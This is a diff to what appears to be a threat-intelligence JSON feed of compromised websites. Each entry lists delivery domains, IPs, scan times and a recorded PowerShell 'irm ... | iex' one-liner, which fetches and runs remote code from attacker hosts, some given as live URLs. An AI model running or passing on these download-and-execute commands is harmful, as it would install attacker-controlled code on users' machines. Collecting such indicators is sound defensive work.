@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "fiftyoff.co.za",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
+    ],
+    "IP": [
+      "41.204.202.6"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
+    ],
+    "ReportId": "cmwnlp7zj1wzj0omlkec6jirx",
+    "ScannedAt": "2026-11-19T13:43:35.418000+00:00"
+  },
+  {
+    "UrlDomain": "new.srdvrbas.ba",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
+    ],
+    "IP": [
+      "65.21.234.24"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8ef4c7e148048fda')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
+    ],
+    "ReportId": "cmwnlotyh1wyr0omlqyh8e3xl",
+    "ScannedAt": "2026-11-19T13:43:17.240000+00:00"
+  },
+  {
     "UrlDomain": "www.igaitconsulting.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -995,25 +1033,5 @@
     ],
     "ReportId": "cmwm7i18s1sda0omler9ihr8u",
     "ScannedAt": "2026-11-18T14:18:19.279000+00:00"
-  },
-  {
-    "UrlDomain": "pterygiumhouston.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "192.254.188.210"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwm6nfdo1scb0omllphe87cz",
-    "ScannedAt": "2026-11-18T13:54:31.270000+00:00"
   }
 ]
